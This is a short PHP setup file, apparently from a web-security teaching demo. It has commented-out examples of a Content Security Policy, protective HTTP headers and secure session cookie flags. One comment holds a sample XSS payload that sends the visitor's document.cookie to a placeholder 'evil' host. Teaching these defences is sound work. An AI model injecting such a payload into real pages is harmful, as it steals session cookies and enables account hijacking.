<?php
    // DEMO: Content Security Policy
    // $csp = "Content-Security-Policy: default-src 'self';";
    // $csp .= " script-src 'self' https://tracker;";
    // $csp .= " img-src 'self' https://tracker;";
    // $csp .= " connect-src 'self' https://tracker";
    // header($csp);

    // DEMO: Other HTTP Headers
    // header("X-Frame-Options: SAMEORIGIN");
    // header("X-XSS-Protection: 1");
    // header("X-Content-Type-Options: nosniff");
    // header("Strict-Transport-Security: max-age=2592000");
    // header("Referrer-Policy: strict-origin-when-cross-origin");

    // DEMO: Session cookie security (secure & httponly flags)
    // $cookieParams = session_get_cookie_params();
    // session_set_cookie_params(
    //     $cookieParams['lifetime'],
    //     $cookieParams['path'],
    //     $cookieParams['domain'],
    //     true,
    //     true
    // );

    // DEMO: XSS Comment
    //:P <script>var img = new Image(); img.src = "http://evil/" + document.cookie;</script>
 
    session_start();
    $GLOBALS['db'] = new PDO('sqlite:data/db');
    $GLOBALS['db']->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
?>